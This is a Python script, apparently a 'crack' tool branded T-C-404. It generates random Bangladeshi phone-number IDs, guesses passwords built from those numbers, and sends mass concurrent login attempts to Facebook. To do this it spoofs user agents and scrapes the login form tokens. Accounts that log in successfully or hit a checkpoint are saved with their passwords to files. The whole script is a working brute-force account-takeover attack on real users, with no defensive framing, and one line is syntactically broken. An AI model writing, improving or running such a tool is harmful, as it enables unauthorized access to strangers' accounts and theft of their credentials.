import os,time,sys
os.system('clear')
from os import path
import os,base64,zlib,pip,urllib
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
logo = """ 
HELLO WORLD
"""
ok = []
cp = []
id = []
session = requests.Session()
user = []
loop = 0
oks = []
cps = []
loop = 0
ua = 'Dalvik/2.1.0 (Linux; U; Android 1; CPH65673X Build/OPM4.579514.034) [FBAN/FB4A;FBAV/9699.0.0.808.9[FBAN/FB4A;FBAV/1779.0.0.88.96;[FBAN/FB4A;FBAV/9706.0.0.88.96;[FBAN/FB4A;FBAV/7398.0.0.88.96;FBBV/426492151;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/CPH65673X;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=3045,height=7743};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 11; CPH69419g Build/OPM4.579514.034) [FBAN/FB4A;FBAV/3006.0.0.808.9[FBAN/FB4A;FBAV/4762.0.0.88.96;[FBAN/FB4A;FBAV/183.0.0.88.96;[FBAN/FB4A;FBAV/6312.0.0.88.96;FBBV/5326933385;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/CPH69419g;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1162,height=2322};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 3; RMX87475l Build/OPM4.579514.034) [FBAN/FB4A;FBAV/9952.0.0.808.9[FBAN/FB4A;FBAV/3143.0.0.88.96;[FBAN/FB4A;FBAV/1701.0.0.88.96;[FBAN/FB4A;FBAV/8523.0.0.88.96;FBBV/3527577794;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/RMX87475l;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2888,height=4755};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 18; RMX3317F Build/OPM4.579514.034) [FBAN/FB4A;FBAV/1151.0.0.808.9[FBAN/FB4A;FBAV/5421.0.0.88.96;[FBAN/FB4A;FBAV/1040.0.0.88.96;[FBAN/FB4A;FBAV/9229.0.0.88.96;FBBV/62779724758;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/RMX3317F;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2206,height=7276};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; RMX11480n Build/OPM4.579514.034) [FBAN/FB4A;FBAV/3146.0.0.808.9[FBAN/FB4A;FBAV/2806.0.0.88.96;[FBAN/FB4A;FBAV/308.0.0.88.96;[FBAN/FB4A;FBAV/6587.0.0.88.96;FBBV/52811016876;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/RMX11480n;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=706,height=1174};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 13; moto g15136v Build/OPM4.579514.034) [FBAN/FB4A;FBAV/7453.0.0.808.9[FBAN/FB4A;FBAV/6167.0.0.88.96;[FBAN/FB4A;FBAV/2162.0.0.88.96;[FBAN/FB4A;FBAV/7371.0.0.88.96;FBBV/48357446201;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/moto g15136v;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2753,height=1041};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 2; RMX22952Z Build/OPM4.579514.034) [FBAN/FB4A;FBAV/9723.0.0.808.9[FBAN/FB4A;FBAV/2927.0.0.88.96;[FBAN/FB4A;FBAV/5285.0.0.88.96;[FBAN/FB4A;FBAV/5859.0.0.88.96;FBBV/1419235172;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/RMX22952Z;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=449,height=4631};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 17; GT-15453y Build/OPM4.579514.034) [FBAN/FB4A;FBAV/8548.0.0.808.9[FBAN/FB4A;FBAV/9326.0.0.88.96;[FBAN/FB4A;FBAV/8279.0.0.88.96;[FBAN/FB4A;FBAV/4087.0.0.88.96;FBBV/50084369326;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/GT-15453y;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2650,height=1923};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; RMX24382h Build/OPM4.579514.034) [FBAN/FB4A;FBAV/535.0.0.808.96[FBAN/FB4A;FBAV/7101.0.0.88.96;[FBAN/FB4A;FBAV/5435.0.0.88.96;[FBAN/FB4A;FBAV/5124.0.0.88.96;FBBV/19053648879;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/RMX24382h;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2538,height=4864};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 15; GT-49806X Build/OPM4.579514.034) [FBAN/FB4A;FBAV/5535.0.0.808.9[FBAN/FB4A;FBAV/8838.0.0.88.96;[FBAN/FB4A;FBAV/1025.0.0.88.96;[FBAN/FB4A;FBAV/8398.0.0.88.96;FBBV/77025542825;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/GT-49806X;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2941,height=7198};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 18; SC-99359f Build/OPM4.579514.034) [FBAN/FB4A;FBAV/4221.0.0.808.9[FBAN/FB4A;FBAV/6577.0.0.88.96;[FBAN/FB4A;FBAV/9352.0.0.88.96;[FBAN/FB4A;FBAV/7914.0.0.88.96;FBBV/36318278322;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/SC-99359f;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1637,height=1739};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; Redmi 14099w Build/OPM4.579514.034) [FBAN/FB4A;FBAV/4743.0.0.808.9[FBAN/FB4A;FBAV/7360.0.0.88.96;[FBAN/FB4A;FBAV/628.0.0.88.96;[FBAN/FB4A;FBAV/4448.0.0.88.96;FBBV/17141943492;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/Redmi 14099w;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=4213,height=3631};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 5; SC-76753r Build/OPM4.579514.034) [FBAN/FB4A;FBAV/589.0.0.808.96[FBAN/FB4A;FBAV/9352.0.0.88.96;[FBAN/FB4A;FBAV/4379.0.0.88.96;[FBAN/FB4A;FBAV/8738.0.0.88.96;FBBV/22243748677;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/SC-76753r;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=322,height=5573};FB_FW/1;]'
ugen=[]
for ua in range(1000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['12' , '13' , '14' , '15'])
      c='SM-A125U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,100)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
def Main():
	os.system('clear')
	print(logo)
	print("<> \033[1;32mBD SIM CODE : [017 018 019 013 015 016] ")
	love = input('<> SELECT : ')
	print('<> EXAMPLE : [1000,5000,10000,15000,20000] ')
	limit = int(input('<> LIMIT : '))
	for nmbr in range(limit):
		lova = ''.join(random.choice(string.digits) for _ in range(2))
		lovb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with tred(max_workers=60) as T-C-404:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('<> CHOICE CODE : '+love)
		print('<> TOTAL ID   :  '+tl)
		print('<> CRACK STARTED....... ')
		print(50*'━')
		for guru in user:
			uid = love+lova+lovb+guru
			pwx = [lova+lovb+guru,love+lova+lovb,love+love]
			T-C-404.submit(test,uid,pwx,tl)
	print(50*'━')
	print(' <> CRACK DONE......... ')
	print(50*'━')
	exit()
def test(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[1;90m[\033[1;92mT-C-404\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
            'method': 'GET',
            'path': '/login/device-based/login/async/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"12.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m[T-C-404-OK] '+cid+' ¤ '+ps+'\33[0;92m')
                oks.append(cid)
                open('/sdcard/T-C-404-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\r\33[1;92m[T-C-404-CP] {uid} ¤ {ps}")
                open('/sdcard/T-C-404-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1        
    except:
        pass
Main()